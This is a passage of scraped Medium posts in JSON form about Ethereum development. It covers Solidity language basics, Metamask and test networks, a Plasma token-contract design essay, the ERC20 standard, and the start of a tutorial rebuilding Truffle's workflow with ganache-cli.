time and will always return the transaction hash. Calls that simply retrieve data from the blockchain or contract are \u201cinstant\u201d and free. We can return any values we want from these calls.setterFunction(ethers) => transaction hash // takes timegetterFunction(free) => any data // happens \"instantly\"Because nodes compete to mine the next block, function calls are executed redundantly across the network. To offset this waste of computing resources, a best practice is to perform as many calculations off-chain as possible.off-chain work => on-chain workThough syntactically similar to JavaScript, Solidity has several major differences. Firstly, variables are strongly typed and there are two types. State variables are primitives, while reference variables point to collections of state variables. If implicitly convertible, types can be coerced into one another.State variables:bool: boolean value (true or false) // default is falselogical operators:!   // logical negation&&  // logical conjunction||  // logical disjunction==  // equality!=  // ineqaulityconditional statements follow short circuiting rulesint / uint: positive or negative integer (\u00b2\u2078 to \u00b2\u00b2\u2075\u2076) // default is 0- can be defined with or without a number suffix- suffix must be a multiple of 8uint = uint256uint8, uint16, uint64, ... , uint256int = int256int8, int16, int64, ... , int256fixed / ufixed: positive or negative point number // default is 0fixedMxN or ufixedMxN// M = number of bits taken by the type; between 0 and 80// N = how many decimal points are available; between 8 and 256; must be divisible by 8ufixed = ufixed128x18fixed  = fixed128x18address: 20 bytes for holding an Ethereum address (40 hexadecimal characters) // default is 0x<address>.balance // get balance<address>.transfer() // send ether from current contract account to <address>// errors will throw<address>.send() // low-level counterpart to transfer()// not recommended because errors are silent (return false)We can also access account variables and functions by calling built-in properties and methods within all addresses. To get the account balance, we can call balance. To send ether to an address from the calling contract account, we can use transfer() (preferable over using send()).<address>.balance => balance in wei<address>.transfer() => transaction hashTo interact with other contract accounts, we can use call and delegatecall (callcode is deprecated) to execute functions within them.<address>.call() // call another contract// return boolean// additional modifiers: .gas() or .value()<address>.callcode() // deprecated<address>.delegatecall() // delegates a function call to another contractCall executes \u201cexternally\u201d while delegatecall executes \u201cinternally\u201d. In other words, delegatecall executes the function of another contract as if it were its own. Equivalent to calling a library function, delegatecall is capable of loading code dynamically from a different contract at runtime. The calling contract\u2019s context (i.e., address, balance, and storage) is preserved; only the code from the called contract is taken.External:<address>.call(\"foo\", 1)Internal:<address>.delegatecall(bytes4(keccak256(\"bar(uint)\")), 2)<library>.bar(2)Reference variables:fixed array: array of single-type elements and unchanging length, (byte, type[N])byte[N] // 0 < N < 33- can be allocated to storage or memory- storage arrays can be any data type- memory arrays can be anything but a mapping- declaring the array public creates a getter function that requires the index of the desired value as a parameterdynamic array: array of single-type elements and changing length (string, bytes, type[])bytes = byte[].length// returns the length of the array// dynamic arrays in storage can be resized by assigning a length.push()// appends a value to the array// new length is returned// storage arrays and bytes (not strings)uint[] memory a = new uint[](<variable length>)// variable length can be defined at runtime by using the new keyword// once defined, it will be of fixed sizemapping: collection of key-value pairs of same typemapping (<key type> => <value type>)// key type can be anything but mapping, dynamic array, contract, enum, or struct// value type can be anything// mapping is basically a hash table// every value is initialized to its default// no length property// key data is not stored, only its keccak256 hash// declaring the mapping public creates a getter function that requires the key of the desired value as a parameterstruct: collection of key-value pairs of different types- a way to define new types- cannot contain a member of its own type- struct values stored as location variables are passed by referenceenum: finite set of custom types- a user defined type- explicitly convertible to integers- requires at least one memberLike a computer\u2019s hard drive and RAM, storage variables point to persisted states while memory variables point to temporary objects, respectively.storage variable => persisted across executions // expensivememory variable => persisted during execution // cheapObviously, state variables are always in storage while local variables of reference type are there by default and can be copied to memory by using the memory keyword. In other words, they are passed by reference. On the other hand, function parameters and return parameters are in memory by default. They are passed by value. To pass them by reference, we can use the storage keyword. Local variables of value type are stored in the EVM stack until the execution completes.storage: state variables (always), local variables of reference type (default)memory: function parameters (default), return parameters (default)call stack: local variables of value type (always) // cheapestSimilar to memory is an area called calldata where parameters of external functions are stored.calldata: external function parametersThough reference variables obviously reference variables in storage, for clarity, we should specify the storage keyword anyway. To copy the referenced variables to memory, we can use the memory keyword.mapping (address => uint) balances;uint storage balance = balances[msg.sender]; // points to sender's balance in storageuint memory balance = balances[msg.sender]; // copies sender's balance to memoryBugs can hide in assumptions about where variables are being stored. This practice prevents this.Like JavaScript, Solidity functions are first-class constructs, meaning they can be passed as parameters to other functions, or be returned by them. Therefore, there are two types of functions. Internal functions are called internally by other functions within the same context (aka, inter-contract message calls). External functions are called externally via transactions (from an external account or another contract). By default, functions are internal but can be changed by using the external keyword.External: EVM => contract A => function 1Internal: contract A (function 1 => function 2)Because contracts can inherit from other contracts, we can also explicitly specify the accessibility of our functions as either public or private. Public functions can be accessed externally via transactions or internally by derived contracts, while private functions can only be accessed by the current contract. If missing the accessibility, functions are assumed to be public.Public: contract A (function 1) => contract B (function 1)Private: contract A (function 1) => contract A (function 2)Though the public and external designations both enable functions to be accessed from the outside, a best practice is to favor external if we expect the functions to ever be called externally. This is because in public functions, the EVM copies the arguments into memory, while external functions just read the arguments stored in the payload. This copying step is expensive, especially for large arguments.public functions: write arguments to memory // expensiveexternal functions: read arguments in payload // cheapType and accessibility of variables can also be specified. As \u201cinternal\u201d properties of contracts, state variables are always internal. Like functions, they can be either public or private depending on whether we want derived contracts to access them. For convenience, automatic getter functions are created for public variables.public variable => variable()It\u2019s important to note that although the private designation prevents other contracts from accessing and modifying its data, the nature of the blockchain is such that everything inside a contract is visible to all external observers. In fact, nothing is ever \u201cdeleted\u201d from the blockchain. When we make a change to our contract state, it does not \u201coverwrite\u201d anything. Though it\u2019s possible to use the selfdestruct operation to \u201cremove\u201d the data in the storage and code area of our contract, nodes have the option to keep them indefinitely.selfdestruct(recipient) => contract \"deleted\"Functions also come with default modifiers. For clarity, functions that do not modify the contract state should be marked as either pure or view. View functions need to read from the state while pure functions do not. Functions that modify state will always return a transaction hash, and nothing else. Functions that handle ethers should be designated as payable. Functions can also be decorated with custom modifiers to easily add additional behaviors and promote code reuse:modifier onlyOwner() {    require(msg.sender == owner);    _;}function foo() onlyOwner {    ...}Underscore indicates when the function body of the decorated function should execute.In summary, functions have the following signature:function doSomething(<parameter types>) {external|internal} {public|private} [pure|view|payable] [modifiers] [returns (<return types>)]<> = required{} = recommended[] = optionalsignature = name + parameter types + function types + accessibility + default modifiers + custom modifiers + return types// explicit function signatures allow for easy translation to ABITo summarize the function types and accessibilities in order of least restrictions:public: accessible by allexternal: only accessible from outsideinternal: accessible by derived contractsprivate: only accessible from withinFunction parameters are defined by type and name. Name cannot be a reserved keyword.function foo(uint a, uint b) {}Functions can return multiple values. If so, they must be declared in the function signature. There are two ways to define the return parameters:Type with name:function foo() returns (uint a) {    a = 3; // return statement not necessary}Type without name:function foo() returns (uint) {    return 3; // return statement required}Contracts can have one anonymous fallback function. This function cannot have arguments and cannot return anything, but a payload can still be supplied with the call. There is a gas limit of 2300, so the function should not do much. The fallback is executed whenever calls to the contract specify functions that do not exist or the payload is empty (i.e., a plain ether transfer). In these cases, for the contract to be able to receive plain ethers, the fallback function must be marked with payable.pragma solidity ^0.4.24;contract Token {    function () payable {        }}Though web3 always ultimately returns the transaction hash for calls that update state, state-changing functions can still return values for other contracts to consume (aka, inter-contract message calls). Nevertheless, it\u2019s still possible for such functions to emit events which web3 can watch for using the transaction hash.Like JavaScript\u2019s console function, events can be used for logging. When called, it causes its arguments to be stored in a special data structure on the blockchain (aka, transaction log). We can emit events within any function, and then watch for them using callbacks via the ABI.Example event:pragma solidity ^0.4.24;contract Token {event Transfer(        address indexed _from,        address indexed _to,        uint256 _value    );function transfer(address _to, uint256 _value) public {        ...        emit Transfer(msg.sender, _to, _value);    }}Example callback:const token = new web3.eth.Contract(ABI, ADDRESS);const event = token.Transfer();event.watch((error, result) => {    if (!error) console.log(result);});Note: Up to 3 event parameters can be indexed for faster queries.To summarize, contract declarations can contain:1. state variables2. reference variables: arrays, structs, enums, mappings3. events4. function modifiers5. constructor function6. fallback function7. external functions8. public functions9. internal functions10. private functions// ideally in this order for convention// within each function group, state-changing functions should come before read-only functions (view before pure)// variable and function names should be camelcaseLike JavaScript, there are special variables and functions that always exist in the EVM\u2019s global namespace. To access information about the transaction or the block, we can use the msg and the block global variables, respectively.Transaction properties:msg.data (bytes): the payloadmsg.gas (uint): remaining gasmsg.sender (address): sender of the message callmsg.sig (bytes4): function identifier (first four bytes of calldata)msg.value (uint): number of wei sent with the message calltx.gasprice (uint): gas price of the transactiontx.origin (address): sender of the transaction // could be insecuregasleft()(uint256): remaining gasBlock properties:block.blockhash(uint blockNumber) returns (bytes32): hash of a given block (no later than 256 blocks ago)block.coinbase (address): address of block minerblock.difficulty (uint): target value for miningblock.gaslimit (uint): total gas limit for transactionsblock.number (uint): height of block in the chainblock.timestamp (uint): time of mining (seconds since unix epoch)now (uint): equivalent to block.timestampUtility functions include cryptographic helpers such as sha256 and keccak256. Time suffixes are also available such as seconds, minutes, hours, days, weeks and years.now = block.timestamp// miners can alter to some degree as long as timestamp is greater than previous block and less than the next block// i.e., 30 second window1 = 1 seconds1 minutes = 60 seconds1 hours = 60 minutes1 days = 24 hours1 weeks = 7 days1 years = 365 days// leap seconds are ignoredEther units are also available: wei, szabo, finney and ether1 ether = 10^18 wei1 ether = 10^6 szabo1 ether = 10^3 finneyLike dollars and cents, wei is the lowest denomination of ethers. It\u2019s not possible to have fractions of wei.1 dollar = 100 cents1 ether = 1,000,000,000,000,000,000 weis// on the blockchain, ethers are stored in domination of weiWe can throw exceptions to handle errors. A thrown exception will always revert the state.assert: checks expected against actual (internal errors)require: ensures valid conditions (external/input errors)revert: always throws an exceptionLike JavaScript, the this variable is also available for easy access to the contract instance itself (can be coerced to the contract\u2019s address). Using this, it\u2019s possible to call internal functions \u201cexternally\u201d from within a contract.foo() => internal call from within contractthis.foo() => external call from within contract via EVMaddress(this) => returns contract addressthis.balance // deprecatedaddress(this).balance // recommendedInline assembly (EVM opcode) is also available to offer granular control over the EVM stack. Though beyond the scope of the typical Solidity developer, awareness of these low-level operations and limitations will prove invaluable during the design process.Writing code is easy. Designing good code is not. For example, because of underlying gas costs and a gas limit on every block, we should not iterate through dynamic arrays of indeterminate size. Instead, we should design our data models in such a way that loops are unnecessary.Poor Design:address[] owners;function isOwner(address owner) returns (bool) {    for (uint i; i < owners.length; i++) {       if (owners[i] == owner) return true;    }    return false;}Good Design:mapping (address => bool) owners;function isOwner(address owner) returns (bool) {    return owners[owner];}To summarize actions that read the state:- reading from state variables- reading from <address>.balance or this.balance- reading from members of block, tx, or msg // except msg.sig and msg.data- calling any function not marked pure- using inline assembly with \"read\" opcodesTo summary actions that modify the state:- sending ethers- creating contracts- changing state variables- emitting events- calling any function not marked as pure or view- calling selfdestruct- using low-level calls- using inline assembly with \"write\" opcodesA quick and easy way to start writing and testing smart contracts is to use Remix, an online editor maintained by the Ethereum Foundation.https://remix.ethereum.orgWith the Remix editor, we can easily author smart contracts using the Solidity programming language. Remix can automatically compile our contract to help audit our code in realtime! When we\u2019re ready, we can tell Remix to use \u201cInjected Web3\u201d (via Metamask) to deploy our contract to a real network.It\u2019s also possible for Remix to create a \u201cfake\u201d in-browser network to help us quickly test our contract! To tell Remix to host a local test network (aka, private network), select \u201cJavaScript VM\u201d for our Environment under the Run tab. For our convenience, five external accounts are automatically created and pre-funded with 100 ethers each.To deploy our contract, we simply provide the arguments that we want to pass to our constructor function before clicking \u201cDeploy\u201d.An \u201cinstance\u201d of our contract now exists on our local network. To help us test our contract, Remix automatically creates input fields for every function that exists in our contract.On the bottom panel, Remix provides a console that outputs all the things that are happening on our local network as we interact with our contract.Note that transactions are processed instantly to save us time when in reality they take much longer. In this author\u2019s opinion, Remix is the best IDE to use during the design phase of the development process!External Account (Client)\u00a0LayerThe external account layer is analogous to the client layer. Architecturally, external accounts exist independently from the network. This is desirable because anyone can create an Ethereum network, and many have been created:- main Ethereum network- remote test networks (Rinkeby, Kovan, Ropsten)- remote private networks- local test network- network forksWith a tool like geth, we can become a node for the main network or our own. In essence, Ethereum is just a protocol, and anyone can implement it.Ethereum protocol => geth => Ethereum network(s)Because external accounts are completely decoupled, the same account can be used across networks! Hence, the name \u201cexternal\u201d account.external account 1 => network Aexternal account 1 => network Bexternal account 1 => ...Thus, external accounts are like \u201cemail addresses\u201d. Just one can be used for authentication across all websites.username + password => email address => any websitespublic key + private key => account address => any networksJust as an email address is created from a username and password, an external account address is created from a public key and private key. One is secret while the other is not. Like websites, dapps provide the user interfaces to the smart contracts that exist on the blockchain. Clients such as Chrome and Mist (or any web3-enabled browser) are the means by which users interact with websites and dapps.User => Email Address   => Website => Server         => DatabaseUser => Account Address => Dapp    => Smart Contract => BlockchainLike having multiple email accounts, having multiple external accounts is useful for protecting our privacy on the public blockchain. However, managing all the various credentials can be frustrating. To ease this burden, we can use BIP39 to generate account addresses and key pairs, algorithmically from a \u201cparent key\u201d, ad infinitum. All we need to remember is a 12-word mnemonic phrase.BIP39(12 words) => array[account addresses, public keys, private keys]Backed by ConsenSys, Metamask is the most popular BIP39 account management tool. Just as web3 is the developer\u2019s portal into the Ethereum blockchain, Metamask is the consumer\u2019s portal. Internally, Metamask also uses web3 to programmatically connect to the network!To create a vault, Metamask generates a random seed phrase (i.e., mnemonic phrase). To help us quickly access our vault without needing to input our seed phrase every time, Metamask asks us to create a password. With such a password, we can lock away our seed phrase in cold storage for maximum security.Internally, each account has a public key, a private key, an address and a balance. For our privacy and security, our account credentials are encrypted and stored locally. Nothing is sent to Metamask. To send ethers, Metamask signs our transaction request using our private key before submitting it to our network of choice. To receive ethers, we simply provide the senders with our address so that they can initiate the request from their end.With Metamask, we can select the main network as well as test networks. We can also setup a local network on port 8545, or provide a URL to a remote network.To better understand the flow, let\u2019s send some ethers using a test network so we don\u2019t have to spend real money. Rinkeby is the most reliable because it uses proof-of-authority instead of proof-of-work. Because ethers in test networks have no real value, there are not enough miners incentivized by proof-of-work to create a healthy level of decentralization. Consequently, attackers can easily take over the mining power. With proof-of-authority, we don\u2019t have to worry about such attacks because blocks are signed by trusted community members (aka, consortium).proof-of-authority => trusted consortiumproof-of-work => competition based on mining powerIn proof-of-work, hash rate (hashes per second) determines how likely a computer is to add the next block of transactions. To disincentivize the need for specialist hardware, Ethereum plans to move from proof-of-work to proof-of-stake. In proof-of-stake, anyone with ethers to stake can participate.proof-of-stake => competition based on putting ethers at stakeBefore we can send ethers, we need some first! To get free ethers, Rinkeby has a faucet we can use. The only requirement (to prevent abuse) is that we authenticate with our social profile.https://faucet.rinkeby.ioOnce we submit our account address, we should see that our balance has increased. Now that we have ethers to spend, let\u2019s try to send some to another account in our vault. First, let\u2019s create a second account.Copy the address of the second account, then switch back to the first account and paste in the address. Provide an amount in ether to send. We can also attach a hexadecimal string as payload. Click Next.Metamask will then ask us to confirm the transaction. Note, Metamask automatically calculates the appropriate gas limit and gas price for us!To determine the best gas values for us, Metamask simulates the function call to our contract (aka, dry run). If there are errors, Metamask will display them too!Click Submit. Metamask will now sign the transaction with our private key and submit it to the Rinkeby network.For our convenience, Metamask records all of our outgoing transactions. Clicking any one will take us to the blockchain where it resides.https://rinkeby.etherscan.io/tx/0x57cbaba8db5b1a868835356c05d1de661a811a7dd81f73a89b787b38665eed43If we switch to our second account, we should see that our balance has updated.Because external accounts are completely decoupled from the blockchain, the dapps we build will never ask for the user\u2019s keys. We can package together the transaction object based on our user\u2019s inputs, but ultimately, the user needs to sign it in order to validate it. Metamask is awesome because when we make a web3 call to submit a transaction, Metamask will bring up a modal to assist the user in the signing process. Therefore, we should build our dapps with Metamask and with this flow in mind.web3(transaction) => Metamask popup => sign(transaction) => networkAs we\u2019ve seen, every transaction will cost some amount of money. Even a tiny update to the blockchain is not free. This means our users will have to pay every time they want to change something. Thus, our value proposition should outweigh these inherent costs.value proposition > transaction feesConclusionTraditional application stacks are clients, servers, and databases. In contrast, Ethereum application stacks are external accounts, smart contracts, and the blockchain. Like JavaScript and the browser, the EVM and the Ethereum client aim to be on every laptop and computer in the world. When the \u201cserver\u201d and the \u201cdatabase\u201d are also managed by the \u201cclient\u201d, we achieve maximal decentralization and distribution. The effect, there are no single points of failure and concentrations of power. Information, value, and wealth are normalized and democratized. Such a network embodies our highest ideals of democracy and freedom.Without the concept of ownership, a free market society is impossible. Trade cannot take place without clear titles of ownership at the outset. The disparity between the rich and the poor is ever increasing, but before we can reverse the trend, we first need to give everyone a means by which to definitively prove ownership. This has been unattainable until now because records of ownership are monopolized by banks and governments, and not all are honest and trustworthy. For a more equitable world to be possible, we need a \u201ctrustless\u201d system that\u2019s immune to corruption.Ethereum is the beginning of such a system. Like a perfect world government, everyone is an equal citizen no matter the background. The only requirement is a private key that no one else has to know, even the \u201cgovernment\u201d. Under such governance, smart contracts are like \u201cbanks\u201d, each storing digital tokens of a real world asset. With a private key, we can permissionlessly enter any \u201cbank\u201d and buy anything from anyone, paying with one universal currency. The anonymous \u201csignatures\u201d we leave behind prove that the transaction took place, immutably and transparently. Ownership is assured. Privacy is protected. Trust and third-parties are disintermediated. Our world government and its banks are secured by cryptoeconomics, a combination of economic incentives and cryptographic verification.A market society that\u2019s truly free is paradisal because it tends towards perfect competition. When actors are able to compete with truthful information and legal guarantee, barriers to entry are reduced for new players. Eventually, a Pareto-optimum equilibrium will be reached such that nobody can be made better off without making someone else worse off. In other words, we undo the widening gap of economic inequality.Trust => Freedom => Love => PeaceAt HeartBank\u00ae, we believe the trustworthiest financial system is a trustless one. Human nature is paradoxical because we\u2019re capable of both extremes. In the absence of trust, our defensive instincts can lead us to the most unimaginable destructions. Where we can trust and feel trusted, we have the capacity to rise up to meet the highest expectations. When we\u2019re free to act from a place of peace, we naturally act with our \u2764\ufe0f.The way to peace is trust(less).You\u2019re now ready to build a real Ethereum dApp! \ud83d\ude07 To learn how, check out:How Truffle Works Under the HoodEthereum dApp Development for Web Developersmedium.comReferences:http://www.ethdocs.org/en/latesthttps://solidity.readthedocs.io/en/v0.4.25/introduction-to-smart-contracts.htmlhttps://ethereum.github.io/yellowpaper/paper.pdfhttps://bitcoin.org/bitcoin.pdfhttps://medium.com/@VitalikButerin/liberation-through-radical-decentralization-22fc4bedc2ac", "responses": "4"}, {"title": "Token Contracts on Plasma or: a Tale about Local and Global Invariants", "author_name": "Christian", "link": "https://medium.com/@chriseth/token-contracts-on-plasma-or-a-tale-about-local-and-global-invariants-e37fadba150?source=search_post", "post_date": "Sep 18, 2017", "readtime": "5 min read", "upvotes": "477", "content": "Token Contracts on Plasma or: a Tale about Local and Global InvariantsChristianBlockedUnblockFollowFollowingSep 18, 2017CC-BY-SA 3.0 by Manfred Werner\u200a\u2014\u200aTsuiThe plasma system defines a structure of interconnected blockchains arranged in a tree structure that promises scalable smart contracts. One of the key ideas there is that each of the blockchains regularly store their current block hash in their parent chain so that users can challenge potentially invalid child state transitions in the parent chain.This model is secure not because of a difficult proof of work (the chains would use proof of stake or even a fixed validator set), but rather because users watch chains they have a stake in and thus will challenge invalid state transitions, potentially escalating as far up as the trusted main chain.Here, the scalability does not come from the fact that blockchains are relieved from their load by creating a big number of smaller chains and moving the transactions there. Scalability is only achieved once a user does not have to verify every single transaction that is sent to the system.If, for example, a user only cares about a single smart contract that resides in a single chain in a leaf of the system, it is sufficient for the user to verify this leaf and all nodes on the path to the root chain. If a transaction is committed by means of block hashes all the way up to the root chain and there is no invalid state transition in the chains on the way up to the root, the user can be reasonably sure that the transaction cannot be retroactively declared invalid.This system still does not solve the scalability problem: As long as the smart contract only lives inside a single blockchain, it can merely process a limited amount of transactions. While this might be enough for some use-cases, a token contract can easily reach this limit. The system would scale, if the token contract exists on all of the blockchains, dividing the token transfer load and it is possible to move tokens up and down the tree. Users would have accounts in only one or perhaps some of the chains and watch the paths to the root from chose chains.In such a simple model, an attacker could select a chain that is mostly unused, take it over, create an invalid state transition that creates tokens out of thin air and then move these tokens up to the root. If nobody is watching the attacked chain (or the attacker can turn off their computers or censor their transactions), the attacker is safe as soon as he or she is able to move the tokens far enough up.Creating tokens out of thin air is a violation of the assumed invariants of a token contract. Unfortunately, in contrast to the other invariant \u201cnobody but me can spend my tokens\u201d, this is a global invariant and thus cannot be enforced by just watching a small number of chains.Luckily, there is an invariant that is almost the same as \u201cnobody can create tokens out of thin air\u201d, but which can be locally enforced: We track the sum of the token balances of each direct child chain in the smart contract of the parent chain and enforce that changes to these numbers always have to come with a respective amount of tokens being moved from the child to the parent or vice-versa. This way, a child chain basically becomes a single account in the parent chain which is only subdivided into the respective token holders in the child chain.In this situation, an attacker can still create tokens in unwatched child chains, but he or she can only move as many tokens out of these flawed chains as is the total balance of these chains. For users that are not interested in these chains, the situation would not change: For them, someone took out tokens from a pool, but it is not relevant who did it.In effect, the attacker of course steals tokens from users who have accounts in the attacked child chains, but at least the impact of the attack is confined to chains that are not properly watched. In turn, this means that you have to constantly watch all chains you have tokens in. But there is also a \u201ccheaper\u201d solution to this:If you do not want to move your tokens very often, you can transfer them to a chain close to the root chain. These chains likely have higher transaction fees (which is not relevant if you just want to park your tokens), but also provide higher security because they are watched by more people.Example Token\u00a0ContractThe following smart contract is replicated on all chains in the system. The smart contract language used follows the syntax and semantic of Solidity, but it has one additional feature: Functions can be marked \u201cedge\u201d.Such functions are executed as part of a transaction sent to an edge of the tree, i.e. sent to two chains at the same time that are linked with an edge in the tree. Parts of the code of these functions are executed on the relative parent and other parts on the relative child in sequence. The actual compiled smart contract will use logs and Merkle proofs for synchronisation between these parts.Inside an edge functions, the identifier child is an integer (0 or 1 for two children) identifying the child relative to the parent.In the event where a child chain is declared faulty, the child parts can also be executed in the parent chain or recursively in any chain on the way up to the root (updating the root hash of the child chain stored in the parent chain and requiring relevant Merkle proofs for execution). A child that does not react to edge transactions after a certain time is declared faulty.Because of the synchronisation points between the \u201cchild\u201d and \u201cparent\u201d parts, the tokens can be safely moved up and down the tree.ConclusionCurrently, you have to put a little more thought into your smart contracts if you want them to be scalable on a plasma-like system. Not every problem is suitable for map-reduce or can be processed using big data algorithms either. If you can come up with elementary promises your smart contract should fulfill and can transform them into local properties, though, you can achieve almost infinite scalablity!", "responses": "3"}, {"title": "The Anatomy of\u00a0ERC20", "author_name": "Steven McKie", "link": "https://medium.com/blockchannel/the-anatomy-of-erc20-c9e5c5ff1d02?source=search_post", "post_date": "Sep 30, 2017", "readtime": "4 min read", "upvotes": "637", "content": "The Anatomy of\u00a0ERC20What\u2019s on the Inside of Ethereum\u2019s Most Popular\u00a0ContractSteven McKieBlockedUnblockFollowFollowingSep 30, 2017Crosspost: This was originally posted by Gerald Nash \u26a1\ufe0f, here. It was reposted to BlockChannel with their permission.In light of today\u2019s ICO launches, digital token sales during which companies and organizations raise millions of dollars instantly while giving out digital assets, it\u2019s important to recognize the underlying technology that nearly all of these tokens possess: ERC20.Ethereum Request for Comments 20, or ERC20, is an Ethereum Improvement Proposal introduced by Fabian Vogelsteller in late 2015. It\u2019s a standard by which many popular Ethereum smart contracts abide. It effectively allows smart contracts to act very similarly to a conventional cryptocurrency like Bitcoin, or Ethereum itself. In saying this, a token hosted on the Ethereum blockchain can be sent, received, checked of its total supply, and checked for the amount that is available on an individual address. This is analogous to sending and receiving Ether or Bitcoin from a wallet, knowing the total amount of coins in circulation, and knowing a particular wallet\u2019s balance of a coin. A smart contract that follows this standard is called an ERC20 token.ERC: Token standard \u00b7 Issue #20 \u00b7 ethereum/EIPsERC: 20 Title: Token standard Status: Draft Type: Informational Created: 19\u201311.2015 Resolution: https://github.com\u2026github.comAll of the previously described functionality is able to exist by defining a set of functions that allow a smart contract to emulate a digital token. But how does that work?ERC20 defines the functions balanceOf\u00a0, totalSupply\u00a0, transfer\u00a0, transferFrom\u00a0, approve\u00a0, and allowance\u00a0. It also has a few optional fields like the token name, symbol, and the number of decimal places with which it will be measured.Note: This is a concise declaration of an example ERC20 contract.An overview and example of each field within the contract is as follows.totalSupply()Although the supply could easily be fixed, as it is with Bitcoin, this function allows an instance of the contract to calculate and return the total amount of the token that exists in circulation.balanceOf()This function allows a smart contract to store and return the balance of the provided address. The function accepts an address as a parameter, so it should be known that the balance of any address is public.approve()When calling this function, the owner of the contract authorizes, or approves, the given address to withdraw instances of the token from the owner\u2019s address.Here, and in later snippets, you may see a variable msg\u00a0. This is an implicit field provided by external applications such as wallets so that they can better interact with the contract. The Ethereum Virtual Machine (EVM) lets us use this field to store and process data given by the external application.In this example, msg.sender is the address of the contract owner.transfer()This function lets the owner of the contract send a given amount of the token to another address just like a conventional cryptocurrency transaction.transferFrom()This function allows a smart contract to automate the transfer process and send a given amount of the token on behalf of the owner.Seeing this might raise a few eyebrows. One may question why we need both transfer() and transferFrom() functions.Consider transferring money to pay a bill. It\u2019s extremely common to send money manually by taking the time to write a check and mail it to pay the bill off. This is like using transfer()\u00a0: you\u2019re doing the money transfer process yourself, without the help of another party.In another situation, you could set up automatic bill pay with your bank. This is like using transferFrom()\u00a0: your bank\u2019s machines send money to pay off the bill on your behalf, automatically. With this function, a contract can send a certain amount of the token to another address on your behalf, without your intervention.Token NameThis is an optional field, but many popular tokens include it so that popular wallets like Mist and MyEtherWallet are able to identify them.contract MyERCToken {  string public constant name = \"My Custom ERC20 Token\";}Token SymbolAnother optional field used to identify a token, this is a three or four letter abbreviation of the token, just like BTC, ETH, AUG, or SJCX.contract MyERCToken {  string public constant symbol = \"MET\";}Number of\u00a0DecimalsAn optional field used to determine to what decimal place the amount of the token will be calculated. The most common number of decimals to consider is 18.contract MyERCToken {  uint8 public constant decimals = 18;}The total source code of ERC20 token that we just created can be found here.In the end, the original ERC20 proposal is rather unappreciated. It opened up avenues for a new set of smart contracts that could be created and distributed in the same fashion as Bitcoin or Ethereum. This proves to be very enticing for young companies, as the entire ERC20 ecosystem is hosted on the Ethereum blockchain, a large pre-existing network of computers. This means that developers and young companies don\u2019t have to attract miners in order to sustain their tokens, something that can save a lot of money. And, these tokens can be hosted on exchanges to be traded like other assets, so investors can easily buy and sell these tokens like more popular currencies.", "responses": ""}, {"title": "How Truffle Works Under the\u00a0Hood", "author_name": "Thon Ly", "link": "https://medium.com/heartbankacademy/how-truffle-works-under-the-hood-f1ff6add416c?source=search_post", "post_date": "Jul 20, 2018", "readtime": "15 min read", "upvotes": "546", "content": "How Truffle Works Under the\u00a0HoodEthereum dApp Development for Web DevelopersThon LyBlockedUnblockFollowFollowingJul 20, 2018Photo: https://github.com/trufflesuite/truffleIntroductionBacked by ConsenSys, Truffle is quickly becoming the premier framework for blockchain development. Like a Swiss army knife, Truffle packs together the best modules and tools to streamline smart contract creation, compilation, testing, and deployment onto Ethereum. In addition, it also supports frontend development using a Redux store that automatically syncs with the contract data. Thus, integration with React is simple and easy. For veterans who developed decentralized applications in the early days, the benefits of Truffle are obvious. For those new to dapp development, your timing is perfect!Written in JavaScript, Truffle modularizes key features to abstract away the complexity and cognitive load. However, if we simply depend on the framework for everything, we miss out on understanding how things actually work under the hood that makes blockchain so special. Any dabbler can code by following directions. Expertise and innovation, on the other hand, require awareness of underlying assumptions and the creativity to challenge them.Thankfully, since it\u2019s all just JavaScript, we should be able to mimic the main functionalities of Truffle from scratch. Starting from an empty node project, we will attempt to create a smart contract, compile it, test it, and deploy it to a real ethereum network. We will also link it to an actual user interface. In so doing, the author hopes to impart a deeper understanding of the core technologies such that development using Truffle is not a dependency, but an expression of a creative choice.Smart Contract1. Create2. Compile3. Test4. DeployUser Interface => Smart ContractA great primer is to have a clear mental model of the Ethereum application stack:A Complete Mental Model for Ethereum dApp DevelopmentBlockchain Application Development for Web Developersmedium.comOur project repo: https://github.com/HeartBankAcademy/dAppTruffle InitSince tokens are such an integral part of the Ethereum ecosystem, let\u2019s try to build one from scratch to better understand how Truffle works under the hood! With npm, we can begin by initializing an empty node project.$ npm initThen, we create empty files and folders with this architecture:build- Token.jsoncontracts- Token.solmigrations- compile.js- deploy.jstest- Token.test.jspackage.jsonLike a Truffle project, the contracts folder houses all the solidity files. By convention, these files should be capitalized to indicate that solidity contracts are akin to \u201cclasses\u201d from which contract \u201cinstances\u201d are instantiated. In our case, it\u2019s just Token.sol. The migrations folder houses the scripts that we use to compile and deploy our contracts. Running compile.js should compile all our solidity files into corresponding json files in the build folder. In our case, it\u2019s just Token.json.compile.js: contracts/*.sol => build/*.jsonWhen we run deploy.js, the bytecode inside our json files should be deployed onto the network of our choice.deploy.js: build/*.json => networkFinally, the test folder houses all our test files. In our case, it\u2019s just Token.test.js.In summary, our project directory should look like this:This step is \u201cequivalent\u201d to executing:$ truffle initWhich creates the following files and folders:Notice the similarities! \ud83d\ude09Truffle DevelopLike Remix, Truffle has a local blockchain we can use during development.$ truffle developWhen we execute this command, Truffle launches a local network on port 9545 and generates a mnemonic phrase from which the first 10 external accounts and private keys are shown for our convenience.Under the hood, Truffle uses a stripped-down version of ganache-cli (previously, TestRPC). Let\u2019s install it globally and then launch a local network to see the similarities.$ sudo npm install -g ganache-cli$ ganache-cliLike Truffle, ganache-cli also generates a mnemonic phrase and displays the first 10 external accounts and private keys. By default, blocks are mined instantly.Using the local network provided by Truffle on port 9545 is optional. If we prefer more controls over our local network, we can use ganache-cli instead by switching over to port 8545.// truffle.jsnetworks: {  development: {    host: \"127.0.0.1\",    port: 8545,    network_id: \"*\"  }}For example, with ganache-cli we can create a more realistic network by specifying a blockTime of 15 seconds.$ ganache-cli --blockTime 15Or, if we prefer a graphical user interface, we can use the ganache desktop app by switching over to port 7545.Now that we understand the function of ganache-cli, let\u2019s install it as a project dependency so we can import it for use later.$ npm install --save ganache-cliWe\u2019re now ready to start coding our smart contract!Truffle CompileTokens represent real-world assets, which we can buy with ethers. As such, the standard token contract, aka ERC20, is understandably complex. For simplicity, we can boil it down to this:In essence, a token contract is just an \u201cinternal\u201d public ledger. While the \u201cexternal\u201d public ledger records account balances in ethers, a token contract records account balances in \u201ctokens\u201d. We can achieve this by using a mapping data structure (balanceOf) with address as the key and uint256 as the value (line 4). As a map object, every \u201caddress balance\u201d in balanceOf will be initialized with 0.ethereum blockchain => \"external\" public ledgertoken contract => 